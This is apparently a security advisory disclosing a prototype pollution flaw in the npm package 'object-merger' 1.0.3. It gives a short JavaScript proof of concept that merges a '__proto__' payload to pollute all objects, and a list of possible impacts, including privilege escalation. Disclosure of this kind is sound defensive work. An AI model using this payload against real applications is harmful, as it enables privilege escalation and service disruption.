# 🚨 Prototype Pollution in [object-merger](https://www.npmjs.com/package/object-merger) 

Version:1.0.3

## Proof of Concept (PoC)

```js
const merge = require('object-merger');

let obj = {};
let ob2j = {};
console.log('Before:', obj.polluted); // undefined
const malicious = JSON.parse('{"__proto__": {"polluted": true}}');

merge(obj, malicious);

console.log('After:', obj.polluted); // true 
console.log(ob2j.polluted) // true
```

## Impact
This vulnerability can lead to:

Privilege escalation - injecting isAdmin: true into all objects

Denial of Service - overriding critical object methods

Unexpected application behavior - polluting objects across the entire application

Remote Code Execution - in combination with other vulnerabilities
